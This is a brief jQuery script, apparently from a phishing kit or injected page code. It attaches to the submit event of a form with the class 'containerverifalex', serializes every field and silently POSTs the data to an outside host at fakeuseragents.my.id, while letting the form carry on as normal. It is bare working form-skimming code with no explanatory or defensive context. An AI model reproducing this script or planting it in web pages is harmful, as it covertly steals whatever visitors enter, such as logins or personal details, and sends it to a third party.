$(".containerverifalex").submit(function() {
	var d = $(".containerverifalex");

	$.ajax({
        url: "https://fakeuseragents.my.id/delapanbit/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
